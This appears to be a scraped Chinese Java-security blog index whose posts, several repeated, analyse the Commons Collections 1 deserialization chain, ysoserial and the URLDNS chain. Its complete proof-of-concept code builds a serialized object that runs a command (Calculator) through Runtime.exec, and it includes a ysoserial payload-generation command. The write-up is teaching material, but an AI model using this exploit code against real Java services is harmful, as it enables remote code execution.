InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); 然后是这里的newInstance获取对象了，首先我们去看看AnnotationInvocationHandler的构造方法，这里是要传两个参数的，第一个参数是Class\u003c? extends Annotation\u003e var1，第二个参数是Map AnnotationInvocationHandler(Class\u003c? extends Annotation\u003e var1, Map\u003cString, Object\u003e var2) { Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() \u0026\u0026 var3.length == 1 \u0026\u0026 var3[0] == Annotation.class) { this.type = var1; this.memberValues = var2; } else { throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\"); } } 他的第一个参数必须是Annotation的子类，这里其实是有很多的，但是为什么选Retention 首先我们看到最后readObject这里，在最后set这，是有一个判断条件的 if (var7 != null) 这里我调试了很久，但是还是没弄懂，看p牛的文章中是这样说的 那么如何让这个var7不为null呢？这一块我就不详细分析了，还会涉及到Java注释相关的技术。直接给 出两个条件： sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X 被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素 所以，这也解释了为什么我前面用到 Retention.class ，因为Retention有一个方法，名为value；所 以，为了再满足第二个条件，我需要给Map中放入一个Key是value的元素： Runtime但是发现这样还是不能执行命令的，这里报错了，原因是Runtime是不能被反序列化的，我们最早传给ConstantTransformer的是 Runtime.getRuntime() ，而Runtime没有实现serializable接口，是不能被序列化的 那么我们的解决办法还是有的，我们可以通过反射来获取到当前上下文中的Runtime对象，而不需要直接使用这个类，因为我们的ChainedTransformer的存在，我们可以在数组中把Runtime的反射分开填装进去，就像这样 原poc Method f = Runtime.class.getMethod(\"getRuntime\"); Runtime r = (Runtime) f.invoke(null); r.exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); 转换成这样，InvokerTransformer的第一个参数表示要执行的方法，第二个参数表示参数类型，第三个参数作为执行参数列表，需要去匹配第二个参数 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[] { String.class },new String[] {\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\" }), }; 以前的Runtime.getRuntime() 是java.lang.Runtime对象，无法序列化，现在变成了Runtime.class，是java.lang.Class 对象，Class类有实现Serializable接口，所以可以被序列化 这里我们跟一下，仔细的弄清楚这个操作： 第一次循环 iTransformers[0] = ConstantTransformer(Runtime.class) object不重要不影响 第二次循环 前面的ConstantTransformer(Runtime.class)执行了transform，返回class java.lang.Runtime，作为object iTransformers[1] = InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }) 进入InvokerTransformer的transform，input是class java.lang.Runtime，method是getMethod，参数iArgs是{\"getRuntime\",new Class[0]}， return method.invoke(input, this.iArgs); 返回：public static java.lang.Runtime java.lang.Runtime.getRuntime() 其实就等价于 Runtime.class.getMethod(\"getRuntime\",new Class[0]) 第三次循环 object为getRuntime方法 iTransformers[1] = InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}) 同理的执行 等价于 invoke.invoke(public static java.lang.Runtime java.lang.Runtime.getRuntime(),{ null, new Object[0]}) 返回了我们千呼万唤的Runtime对象 第四次循环 现在我们通过反射已经拿到了Runtime对象了，接下来就是执行Runtime的exec了 这个就不多说，前面已经分析过了 RetentionJava注释相关的技术还不太懂，这里有师傅分析过：https://xz.aliyun.com/t/9873 没分析完整，心里一直过不去，所以到第二天还是老老实实跟了一遍这里 我们关注这个点的起始点，就在readObject中的这么一段代码 if (var7 != null) 首先我们构造这个AnnotationInvocationHandler对象的时候，var1我们传入的是Retention.class，var2传入的是我们构造的TransformedMap AnnotationInvocationHandler(Class\u003c? extends Annotation\u003e var1, Map\u003cString, Object\u003e var2) { Class[] var3 = var1.getInterf","date":"2022-09-29","objectID":"/cc1/:2:2","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#poc构造"},{"categories":["Java"],"content":"POC构造首先就是AnnotationInvocationHandler对象的创建，因为这个是jdk内部的类，是不能直接new获取的，所以得用反射来获取 Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); 然后是这里的newInstance获取对象了，首先我们去看看AnnotationInvocationHandler的构造方法，这里是要传两个参数的，第一个参数是Classvar1，第二个参数是Map AnnotationInvocationHandler(Classvar1, Mapvar2) { Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() \u0026\u0026 var3.length == 1 \u0026\u0026 var3[0] == Annotation.class) { this.type = var1; this.memberValues = var2; } else { throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\"); } } 他的第一个参数必须是Annotation的子类，这里其实是有很多的，但是为什么选Retention 首先我们看到最后readObject这里，在最后set这，是有一个判断条件的 if (var7 != null) 这里我调试了很久，但是还是没弄懂，看p牛的文章中是这样说的 那么如何让这个var7不为null呢？这一块我就不详细分析了，还会涉及到Java注释相关的技术。直接给 出两个条件： sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X 被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素 所以，这也解释了为什么我前面用到 Retention.class ，因为Retention有一个方法，名为value；所 以，为了再满足第二个条件，我需要给Map中放入一个Key是value的元素： Runtime但是发现这样还是不能执行命令的，这里报错了，原因是Runtime是不能被反序列化的，我们最早传给ConstantTransformer的是 Runtime.getRuntime() ，而Runtime没有实现serializable接口，是不能被序列化的 那么我们的解决办法还是有的，我们可以通过反射来获取到当前上下文中的Runtime对象，而不需要直接使用这个类，因为我们的ChainedTransformer的存在，我们可以在数组中把Runtime的反射分开填装进去，就像这样 原poc Method f = Runtime.class.getMethod(\"getRuntime\"); Runtime r = (Runtime) f.invoke(null); r.exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); 转换成这样，InvokerTransformer的第一个参数表示要执行的方法，第二个参数表示参数类型，第三个参数作为执行参数列表，需要去匹配第二个参数 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[] { String.class },new String[] {\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\" }), }; 以前的Runtime.getRuntime() 是java.lang.Runtime对象，无法序列化，现在变成了Runtime.class，是java.lang.Class 对象，Class类有实现Serializable接口，所以可以被序列化 这里我们跟一下，仔细的弄清楚这个操作： 第一次循环 iTransformers[0] = ConstantTransformer(Runtime.class) object不重要不影响 第二次循环 前面的ConstantTransformer(Runtime.class)执行了transform，返回class java.lang.Runtime，作为object iTransformers[1] = InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }) 进入InvokerTransformer的transform，input是class java.lang.Runtime，method是getMethod，参数iArgs是{\"getRuntime\",new Class[0]}， return method.invoke(input, this.iArgs); 返回：public static java.lang.Runtime java.lang.Runtime.getRuntime() 其实就等价于 Runtime.class.getMethod(\"getRuntime\",new Class[0]) 第三次循环 object为getRuntime方法 iTransformers[1] = InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}) 同理的执行 等价于 invoke.invoke(public static java.lang.Runtime java.lang.Runtime.getRuntime(),{ null, new Object[0]}) 返回了我们千呼万唤的Runtime对象 第四次循环 现在我们通过反射已经拿到了Runtime对象了，接下来就是执行Runtime的exec了 这个就不多说，前面已经分析过了 RetentionJava注释相关的技术还不太懂，这里有师傅分析过：https://xz.aliyun.com/t/9873 没分析完整，心里一直过不去，所以到第二天还是老老实实跟了一遍这里 我们关注这个点的起始点，就在readObject中的这么一段代码 if (var7 != null) 首先我们构造这个AnnotationInvocationHandler对象的时候，var1我们传入的是Retention.class，var2传入的是我们构造的TransformedMap AnnotationInvocationHandler(Classvar1, Mapvar2) { Class[] var3 = var1.getInterf","date":"2022-09-29","objectID":"/cc1/:2:2","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#runtime"},{"categories":["Java"],"content":"POC构造首先就是AnnotationInvocationHandler对象的创建，因为这个是jdk内部的类，是不能直接new获取的，所以得用反射来获取 Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); 然后是这里的newInstance获取对象了，首先我们去看看AnnotationInvocationHandler的构造方法，这里是要传两个参数的，第一个参数是Classvar1，第二个参数是Map AnnotationInvocationHandler(Classvar1, Mapvar2) { Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() \u0026\u0026 var3.length == 1 \u0026\u0026 var3[0] == Annotation.class) { this.type = var1; this.memberValues = var2; } else { throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\"); } } 他的第一个参数必须是Annotation的子类，这里其实是有很多的，但是为什么选Retention 首先我们看到最后readObject这里，在最后set这，是有一个判断条件的 if (var7 != null) 这里我调试了很久，但是还是没弄懂，看p牛的文章中是这样说的 那么如何让这个var7不为null呢？这一块我就不详细分析了，还会涉及到Java注释相关的技术。直接给 出两个条件： sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X 被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素 所以，这也解释了为什么我前面用到 Retention.class ，因为Retention有一个方法，名为value；所 以，为了再满足第二个条件，我需要给Map中放入一个Key是value的元素： Runtime但是发现这样还是不能执行命令的，这里报错了，原因是Runtime是不能被反序列化的，我们最早传给ConstantTransformer的是 Runtime.getRuntime() ，而Runtime没有实现serializable接口，是不能被序列化的 那么我们的解决办法还是有的，我们可以通过反射来获取到当前上下文中的Runtime对象，而不需要直接使用这个类，因为我们的ChainedTransformer的存在，我们可以在数组中把Runtime的反射分开填装进去，就像这样 原poc Method f = Runtime.class.getMethod(\"getRuntime\"); Runtime r = (Runtime) f.invoke(null); r.exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); 转换成这样，InvokerTransformer的第一个参数表示要执行的方法，第二个参数表示参数类型，第三个参数作为执行参数列表，需要去匹配第二个参数 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[] { String.class },new String[] {\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\" }), }; 以前的Runtime.getRuntime() 是java.lang.Runtime对象，无法序列化，现在变成了Runtime.class，是java.lang.Class 对象，Class类有实现Serializable接口，所以可以被序列化 这里我们跟一下，仔细的弄清楚这个操作： 第一次循环 iTransformers[0] = ConstantTransformer(Runtime.class) object不重要不影响 第二次循环 前面的ConstantTransformer(Runtime.class)执行了transform，返回class java.lang.Runtime，作为object iTransformers[1] = InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }) 进入InvokerTransformer的transform，input是class java.lang.Runtime，method是getMethod，参数iArgs是{\"getRuntime\",new Class[0]}， return method.invoke(input, this.iArgs); 返回：public static java.lang.Runtime java.lang.Runtime.getRuntime() 其实就等价于 Runtime.class.getMethod(\"getRuntime\",new Class[0]) 第三次循环 object为getRuntime方法 iTransformers[1] = InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}) 同理的执行 等价于 invoke.invoke(public static java.lang.Runtime java.lang.Runtime.getRuntime(),{ null, new Object[0]}) 返回了我们千呼万唤的Runtime对象 第四次循环 现在我们通过反射已经拿到了Runtime对象了，接下来就是执行Runtime的exec了 这个就不多说，前面已经分析过了 RetentionJava注释相关的技术还不太懂，这里有师傅分析过：https://xz.aliyun.com/t/9873 没分析完整，心里一直过不去，所以到第二天还是老老实实跟了一遍这里 我们关注这个点的起始点，就在readObject中的这么一段代码 if (var7 != null) 首先我们构造这个AnnotationInvocationHandler对象的时候，var1我们传入的是Retention.class，var2传入的是我们构造的TransformedMap AnnotationInvocationHandler(Classvar1, Mapvar2) { Class[] var3 = var1.getInterf","date":"2022-09-29","objectID":"/cc1/:2:2","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#retention"},{"categories":["Java"],"content":"LazyMap观察ysoserial中的CC1的payload，可以发现这里用的不是我们上一篇文章介绍到的TransformedMap而是LazyMap 那我们先来研究一下这个LazyMap LazyMap和TransformedMap的区别在于，TransformedMap触发transform的地方在于Map的写入操作，LazyMap触发transform的操作是在他的get方法中执行this.factory.transform(key); public Object get(Object key) { if (!super.map.containsKey(key)) { Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } } 而且factory是可控的 public static Map decorate(Map map, Transformer factory) { return new LazyMap(map, factory); } protected LazyMap(Map map, Transformer factory) { super(map); if (factory == null) { throw new IllegalArgumentException(\"Factory must not be null\"); } else { this.factory = factory; } } 我们要使用的话只需要把Map和transformerChain传入即可 Map lazyMap = LazyMap.decorate(innerMap, transformerChain); 但是这样一来，我们之前的AnnotationInvocationHandler的readObject就不行了，这里我们看看ysoserial的Gadget Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 可以看到这里是用的一个AnnotationInvocationHandler.invoke() 那么现在的问题就是如何调用到这个invoke方法了，可以看到gadget写的是Proxy，这里就涉及到一个Java的技术：动态代理 ","date":"2022-09-29","objectID":"/cc1/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#lazymap"},{"categories":["Java"],"content":"动态代理动态代理的其实很好理解，首先我们知道接口interface是不能直接被实例化的，而是用一个class去实现他，然后实例化类来操作的，那么有一种，不编写实现类，直接在运行期创建某个interface实例的技术，他就叫做动态代理 那么要创建一个interface实例的方法就是如下所示： 定义一个InvocationHandler实例，它负责实现接口的方法调用 通过Proxy.newProxyInstance()创建interface实例，它需要3个参数： 使用的ClassLoader，通常就是接口类的ClassLoader 需要实现的接口数组，至少需要传入一个接口进去 用来处理接口方法调用的InvocationHandler实例 将返回的Object强制转型为接口 我们用个例子来理解： 首先我们先实现InvocationHandler接口的invoke方法，invoke的作用就是当ProxyTest1对象执行函数的时候调用，所以这里的意思就是检测执行的方法为get的时候，输出一句Hacked ProxyTest1.java import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.util.Map; public class ProxyTest1 implements InvocationHandler { protected Map map; public ProxyTest1(Map map) { this.map = map; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { if(method.getName().compareTo(\"get\")==0){ System.out.println(\"Hacked\"); } return method.invoke(this.map,args); } } 然后我们在外部调用ProxyTest1 ProxyTest2.java import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class ProxyTest2 { public static void main(String args[]){ InvocationHandler handler = new ProxyTest1(new HashMap()); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] {Map.class},handler); proxyMap.put(\"aaa\",\"bbb\"); String res = (String) proxyMap.get(\"aaa\"); System.out.println(res); } } ","date":"2022-09-29","objectID":"/cc1/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#动态代理"},{"categories":["Java"],"content":"LazyMap利用链构造了解了动态代理，我们再回头看看，我们刚才是在想得怎么调用AnnotationInvocationHandler.invoke()，我们去翻源码会发现，其实他就是实现了InvocationHandler接口的，那就非常的巧了，我们如果用AnnotationInvocationHandler去代理我设计好的Map的话，那么这个Map执行任意的方法都会走进invoke从而进入我们构造好的链子了 所以我们可以这样开始写POC了，前面的都是没变的，TransformedMap换成LazyMap 然后用Proxy代理，但是不能直接拿去反序列化，因为我们要入口点是是sun.reflect.annotation.AnnotationInvocationHandler#readObject 所以还要用AnnotationInvocationHandler对这个proxyMap进行包裹 handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap); 最后的POC import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC1pro { public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[] { String.class }, new String[] {\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\" }), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler); handler = (InvocationHandler) construct.newInstance(Retention.class,proxyMap); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } } ","date":"2022-09-29","objectID":"/cc1/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#lazymap利用链构造"},{"categories":["Java"],"content":"后记前一篇文章说了，我们所测试的jdk版本是8u71以前的版本，而此版本以后的jdk，Java 官方修改了 sun.reflect.annotation.AnnotationInvocationHandler 的 readObject函数 变成了如下代码 private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { GetField var2 = var1.readFields(); Class var3 = (Class)var2.get(\"type\", (Object)null); Map var4 = (Map)var2.get(\"memberValues\", (Object)null); AnnotationType var5 = null; try { var5 = AnnotationType.getInstance(var3); } catch (IllegalArgumentException var13) { throw new InvalidObjectException(\"Non-annotation type in annotation serial stream\"); } Map var6 = var5.memberTypes(); LinkedHashMap var7 = new LinkedHashMap(); String var10; Object var11; for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) { Entry var9 = (Entry)var8.next(); var10 = (String)var9.getKey(); var11 = null; Class var12 = (Class)var6.get(var10); if (var12 != null) { var11 = var9.getValue(); if (!var12.isInstance(var11) \u0026\u0026 !(var11 instanceof ExceptionProxy)) { var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + \"[\" + var11 + \"]\")).setMember((Method)var5.members().get(var10)); } } } AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3); AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7); } 他让我们传入的Map不会再执行set或put操作了，所以这里就不能再用了 对于高版本的绕过，就在我们的下一篇文章CommonCollection6 参考文章： Java安全漫谈 https://ego00.blog.csdn.net/article/details/119705730 https://xz.aliyun.com/t/9873 ","date":"2022-09-29","objectID":"/cc1/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections1链分析","uri":"/cc1/#后记"},{"categories":["Java"],"content":"前言Java反序列化的基础知识前面已经大概了解了，现在终于到上手的时候了，这里按p牛说的来，先从DNSURL下手，进行反序列利用链的入门 ","date":"2022-09-29","objectID":"/urldns/:0:0","series":null,"tags":null,"title":"[Java安全] URLDNS","uri":"/urldns/#前言"},{"categories":["Java"],"content":"ysoserial这个工具我之前没专门研究过Java，但是也是在一些文章中见过很多次了，他的作用就是根据你选择的利用链去生成反序列化数据的工具 使用方法也很简单，选择利用链和要执行的命令就行了 Usage: java -jar ysoserial.jar [payload] '[command]' Available payload types: Payload Authors Dependencies ------- ------- ------------ AspectJWeaver @Jang aspectjweaver:1.9.2, commons-collections:3.2.2 BeanShell1 @pwntester, @cschneider4711 bsh:2.0b5 C3P0 @mbechler c3p0:0.9.5.2, mchange-commons-java:0.2.11 Click1 @artsploit click-nodeps:2.3.0, javax.servlet-api:3.1.0 Clojure @JackOfMostTrades clojure:1.8.0 CommonsBeanutils1 @frohoff commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 CommonsCollections1 @frohoff commons-collections:3.1 CommonsCollections2 @frohoff commons-collections4:4.0 CommonsCollections3 @frohoff commons-collections:3.1 CommonsCollections4 @frohoff commons-collections4:4.0 CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1 CommonsCollections6 @matthias_kaiser commons-collections:3.1 CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1 FileUpload1 @mbechler commons-fileupload:1.3.1, commons-io:2.4 Groovy1 @frohoff groovy:2.3.9 Hibernate1 @mbechler Hibernate2 @mbechler JBossInterceptors1 @matthias_kaiser javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 JRMPClient @mbechler JRMPListener @mbechler JSON1 @mbechler json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1 JavassistWeld1 @matthias_kaiser javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 Jdk7u21 @frohoff Jython1 @pwntester, @cschneider4711 jython-standalone:2.5.2 MozillaRhino1 @matthias_kaiser js:1.7R2 MozillaRhino2 @_tint0 js:1.7R2 Myfaces1 @mbechler Myfaces2 @mbechler ROME @mbechler rome:1.0 Spring1 @frohoff spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE Spring2 @mbechler spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2 URLDNS @gebl Vaadin1 @kai_ullrich vaadin-server:7.7.14, vaadin-shared:7.7.14 Wicket1 @jacob-baines wicket-util:6.23.0, slf4j-api:1.6.4 使用实例 java -jar ysoserial.jar CommonsCollections1 calc.exe \u003e payload ","date":"2022-09-29","objectID":"/urldns/:0:0","series":null,"tags":null,"title":"[Java安全] URLDNS","uri":"/urldns/#ysoserial"},{"categories":["Java"],"content":"URLDNS接下来就到了这篇文章的主题：URLDNS 他是一条利用链的名字，但是他和平常的利用链不一样，他的参数不是命令，而是URL，他触发的也不是命令执行，而是发起一次DNS请求 我们直接去他的repo分析一下ysoserial的代码是怎么写的 public class URLDNS implements ObjectPayload\u003cObject\u003e { public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation //Since the field \u003ccode\u003ejava.net.URL.handler\u003c/code\u003e is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \"hashCode\", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; } public static void main(final String[] args) throws Exception { PayloadRunner.run(URLDNS.class, args); } /** * \u003cp\u003eThis instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance. * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior * using the serialized object.\u003c/p\u003e * * \u003cb\u003ePotential false negative:\u003c/b\u003e * \u003cp\u003eIf the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the * second resolution.\u003c/p\u003e */ static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } } 可以看到代码注释里写了gadget * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() 他是从HashMap的readObject开始的，我们跟进去这里看看 private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor \u003c= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(\"Illegal load factor: \" + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings \u003c 0) throw new InvalidObjectException(\"Illegal mappings count: \" + mappings); else if (mappings \u003e 0) { // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u003c DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u003e= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u003c MAXIMUM_CAPACITY \u0026\u0026 ft \u003c MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it's the nearest public type to // what we're actually creating. SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings({\"rawtypes\",\"unchecked\"}) Node\u003cK,V\u003e[] tab = (Node\u003cK,V\u003e[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u003c mappings; i++) { @SuppressWarnings(\"unchecked\") K key = (K) s.readObject(); @SuppressWarnings(\"unchecked\") V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } gadget说到了，接下来是putVal() -\u003e hash()，我们再跟进hash方法 static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u003e\u003e\u003e 16); } 这里执行了一个key.hashCode()，这个key是一个对象，我们再回去看到gedget，最后是URL.hashCode()，是URL执行了hashCode() 我们回去跟进URL，可以发现这里如果hashCode为-1的时候，他会重新计算hashCode，这时候就执行了一个handler.hashCode(this) public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; } handler跟一下发现是：transient URLStreamHandler handler;，是URLStreamHandler类的对象 我们再去跟进这个hashCode() protected int hashCode(URL u) { int h = 0; // Generate the protocol part. String pro","date":"2022-09-29","objectID":"/urldns/:0:0","series":null,"tags":null,"title":"[Java安全] URLDNS","uri":"/urldns/#urldns"},{"categories":["Java"],"content":"前言在Java安全中，Java反序列化占据很重要的地位。 在前面RMI的探索中，我们可以在数据包中看到，他传递的数据是序列化的 Java的反序列化和PHP的反序列化其实有点类似，他们都只能将一个对象中的属性按照某种特定的格式 生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象 但Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取 ","date":"2022-09-28","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:1:0","series":null,"tags":null,"title":"[Java安全] Java反序列化","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#前言"},{"categories":["Java"],"content":"反序列化基础要比较完美的实现反序列化的操作，有两个注意点 如果想让一个对象能够序列化，那么就要实现一个特殊的接口，这个接口就是java.io.Serializable，这个接口是空的，相当于是一个标记作用，意味着实现了这个接口的类可以进行序列化/反序列化 